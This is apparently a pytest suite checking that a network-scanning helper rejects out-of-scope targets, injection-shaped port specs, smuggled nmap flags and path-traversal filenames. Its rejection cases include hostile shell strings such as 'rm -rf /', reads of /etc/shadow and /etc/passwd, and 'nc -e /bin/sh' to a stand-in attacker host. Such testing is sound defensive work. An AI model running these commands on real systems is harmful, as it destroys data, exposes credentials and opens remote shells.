"""Validation tests for the privileged helper.

These encode the M3 security requirements directly: out-of-scope targets and
injection-shaped port specs must be refused *by the helper*, independently of
whatever the backend did or did not check.
"""

from __future__ import annotations

import ipaddress

import pytest

from helper.validation import (
    ValidationError,
    validate_mode,
    validate_ports,
    validate_rules_filename,
    validate_sha256,
    validate_target,
    validate_targets,
)

# helper/config.py defaults MONITORED_NETWORK to 192.168.10.0/24.


# --------------------------------------------------------------------------
# Targets
# --------------------------------------------------------------------------


@pytest.mark.parametrize(
    "target",
    ["192.168.10.0/24", "192.168.10.5", "192.168.10.0/25", "192.168.10.128/25"],
)
def test_targets_inside_monitored_network_are_accepted(target):
    assert isinstance(validate_target(target), ipaddress.IPv4Network)


@pytest.mark.parametrize(
    "target",
    [
        "8.8.8.8/32",  # the DoD example
        "8.8.8.8",
        "192.168.11.0/24",  # adjacent subnet
        "10.0.0.0/8",
        "0.0.0.0/0",  # supernet — must not pass via an overlap check
        "192.168.0.0/16",  # supernet containing the monitored range
    ],
)
def test_targets_outside_monitored_network_are_rejected(target):
    with pytest.raises(ValidationError) as exc:
        validate_target(target)
    assert exc.value.code in {"target_out_of_scope", "target_too_large", "forbidden_target"}


@pytest.mark.parametrize(
    "target",
    ["127.0.0.1", "127.0.0.0/8", "169.254.1.1", "224.0.0.1", "240.0.0.1"],
)
def test_loopback_linklocal_multicast_reserved_are_rejected(target):
    with pytest.raises(ValidationError):
        validate_target(target)


@pytest.mark.parametrize(
    "target",
    [
        "192.168.10.1; rm -rf /",
        "192.168.10.1 && cat /etc/shadow",
        "$(whoami)",
        "`id`",
        "192.168.10.1|nc attacker 4444",
        "example.com",
        "localhost",
        "192.168.10.1\nrm -rf /",
        "../../etc/passwd",
        "",
        "   ",
    ],
)
def test_injection_shaped_targets_are_rejected(target):
    """None of these should ever reach nmap, let alone a shell."""
    with pytest.raises(ValidationError):
        validate_target(target)


def test_non_string_targets_are_rejected():
    for bad in [None, 42, ["192.168.10.1"], {"ip": "192.168.10.1"}]:
        with pytest.raises(ValidationError):
            validate_target(bad)


def test_validate_targets_requires_non_empty_list():
    for bad in [None, [], "192.168.10.1", {}]:
        with pytest.raises(ValidationError):
            validate_targets(bad)


def test_validate_targets_rejects_the_batch_if_any_member_is_bad():
    with pytest.raises(ValidationError):
        validate_targets(["192.168.10.0/25", "8.8.8.8/32"])


def test_oversized_target_is_rejected():
    with pytest.raises(ValidationError) as exc:
        validate_target("192.168.0.0/12")
    assert exc.value.code in {"target_too_large", "target_out_of_scope"}


# --------------------------------------------------------------------------
# Ports
# --------------------------------------------------------------------------


@pytest.mark.parametrize(
    "spec,expected_count",
    [("80", 1), ("22,80,443", 3), ("1-1024", 1024), ("22,1000-1010", 12)],
)
def test_valid_port_specs(spec, expected_count):
    assert validate_ports(spec).count == expected_count


@pytest.mark.parametrize(
    "spec",
    [
        "1-1024; rm -rf /",  # the DoD example
        "80 && id",
        "80|nc -e /bin/sh",
        "$(cat /etc/passwd)",
        "`reboot`",
        "80\nrm -rf /",
        "-p-",
        "--script=vuln",
        "80;",
        "abc",
        "",
        "   ",
        "80,,443",
        "80-",
        "-80",
    ],
)
def test_injection_shaped_port_specs_are_rejected(spec):
    with pytest.raises(ValidationError) as exc:
        validate_ports(spec)
    assert exc.value.code == "invalid_ports"


@pytest.mark.parametrize("spec", ["0", "65536", "0-100", "1-65536", "99999"])
def test_out_of_range_ports_are_rejected(spec):
    with pytest.raises(ValidationError):
        validate_ports(spec)


def test_reversed_port_range_is_rejected():
    with pytest.raises(ValidationError, match="reversed"):
        validate_ports("1024-22")


def test_port_spec_is_reserialised_not_echoed():
    """The caller's string is discarded; nmap gets a regenerated canonical form."""
    assert validate_ports("22,1000-1010").to_nmap() == "22,1000-1010"
    assert validate_ports("80-80").to_nmap() == "80"


def test_too_many_ranges_rejected():
    with pytest.raises(ValidationError):
        validate_ports(",".join(str(p) for p in range(1, 200)))


# --------------------------------------------------------------------------
# Modes
# --------------------------------------------------------------------------


@pytest.mark.parametrize("mode", ["tcp_syn", "tcp_connect", "udp", "ping", "service_version"])
def test_known_modes_map_to_fixed_flags(mode):
    flags = validate_mode(mode)
    assert isinstance(flags, tuple) and flags


@pytest.mark.parametrize("mode", ["-sS", "--script=vuln", "tcp_syn; id", "", None, 5, "unknown"])
def test_caller_cannot_supply_nmap_flags(mode):
    """`mode` is an enum name, never a flag. This is the whole point."""
    with pytest.raises(ValidationError):
        validate_mode(mode)


# --------------------------------------------------------------------------
# Rule filenames (M4 uses these)
# --------------------------------------------------------------------------


@pytest.mark.parametrize("name", ["suricata.rules", "emerging-threats.rules", "custom_01.rules"])
def test_valid_rules_filenames(name):
    assert validate_rules_filename(name) == name


@pytest.mark.parametrize(
    "name",
    [
        "../../etc/passwd",
        "../suricata.rules",
        "/etc/suricata/suricata.rules",
        "sub/dir.rules",
        "suricata.rules.bak",
        "suricata.yaml",
        "sur icata.rules",
        "suricata.rules\n",
        ".rules",
        "",
    ],
)
def test_traversal_and_bad_rules_filenames_are_rejected(name):
    with pytest.raises(ValidationError):
        validate_rules_filename(name)


def test_sha256_validation():
    assert validate_sha256("a" * 64) == "a" * 64
    assert validate_sha256(("A" * 64)) == "a" * 64
    for bad in ["", "z" * 64, "a" * 63, "a" * 65, None, 123, "../" + "a" * 61]:
        with pytest.raises(ValidationError):
            validate_sha256(bad)
